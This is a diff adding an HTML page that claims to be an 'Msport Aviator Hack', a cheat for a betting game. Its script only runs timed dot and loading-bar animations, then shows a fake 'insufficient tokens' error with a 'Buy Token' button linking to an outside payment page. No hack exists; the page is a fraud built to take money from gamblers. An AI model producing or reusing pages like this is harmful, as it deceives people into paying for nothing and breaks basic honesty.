@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Msport Hack</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body, html {
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+    .hidden {
+      display: none;
+    }
+    .center {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+    }
+    .box-button {
+      background-image: url('image.jpg');
+      background-size: cover;
+      background-position: center;
+      width: 300px;
+      height: 200px;
+      border: 3px solid yellow;
+      cursor: pointer;
+      position: relative;
+    }
+    .logo {
+      width: 80px;
+      position: absolute;
+      top: -60px;
+      left: 50%;
+      transform: translateX(-50%);
+    }
+    header {
+      position: absolute;
+      top: 20px;
+      width: 100%;
+      text-align: center;
+      font-size: 2rem;
+      font-weight: bold;
+    }
+    /* Page 2: Dot animation */
+    .dot-loader span {
+      display: inline-block;
+      width: 15px;
+      height: 15px;
+      margin: 0 5px;
+      background-color: yellow;
+      border-radius: 50%;
+      opacity: 0.3;
+      animation: blink 1.5s infinite ease-in-out;
+    }
+    .dot-loader span:nth-child(2) { animation-delay: 0.3s; }
+    .dot-loader span:nth-child(3) { animation-delay: 0.6s; }
+    @keyframes blink {
+      0%, 80%, 100% { opacity: 0.3; }
+      40% { opacity: 1; }
+    }
+    /* Page 3: Loading bar */
+    .loading-bar {
+      width: 300px;
+      height: 20px;
+      border: 2px solid yellow;
+      position: relative;
+      overflow: hidden;
+    }
+    .bar {
+      background-color: yellow;
+      width: 0%;
+      height: 100%;
+      animation: load 12s linear forwards;
+    }
+    @keyframes load {
+      from { width: 0%; }
+      to { width: 100%; }
+    }
+    /* Page 4 */
+    #page4 {
+      color: yellow;
+    }
+    .error-message {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 10px;
+      color: red;
+    }
+    .button-container {
+      margin-top: 20px;
+    }
+    .buy-button, .back-button {
+      background-color: yellow;
+      color: black;
+      border: none;
+      padding: 10px 20px;
+      margin: 0 10px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body style="background-color: black; color: yellow;">
+  <div id="page1">
+    <header>Msport Aviator Hack</header>
+    <div class="center">
+      <div class="box-button" onclick="goToPage2()">
+        <img class="logo" src="logo.png" alt="Logo" />
+      </div>
+    </div>
+  </div>
+
+  <div id="page2" class="center hidden">
+    <h1>Launching Msport Aviator</h1>
+    <div class="dot-loader">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+
+  <div id="page3" class="center hidden">
+    <h1>Loading..</h1>
+    <div class="loading-bar">
+      <div class="bar"></div>
+    </div>
+  </div>
+
+  <div id="page4" class="center hidden">
+    <div class="error-message">Failed to load Aviator due to insufficient tokens</div>
+    <p>You need 10 tokens for 10 minutes</p>
+    <div class="button-container">
+      <button class="buy-button" onclick="window.location.href='https://stkhack.github.io/payin/'">Buy Token</button>
+      <button class="back-button" onclick="goToPage1()">Back</button>
+    </div>
+  </div>
+
+  <script>
+    function goToPage2() {
+      document.getElementById('page1').classList.add('hidden');
+      document.getElementById('page2').classList.remove('hidden');
+      setTimeout(() => {
+        document.getElementById('page2').classList.add('hidden');
+        document.getElementById('page3').classList.remove('hidden');
+        setTimeout(() => {
+          document.getElementById('page3').classList.add('hidden');
+          document.getElementById('page4').classList.remove('hidden');
+        }, 12000);
+      }, 10000);
+    }
+
+    function goToPage1() {
+      document.getElementById('page4').classList.add('hidden');
+      document.getElementById('page1').classList.remove('hidden');
+    }
+  </script>
+</body>
+</html>
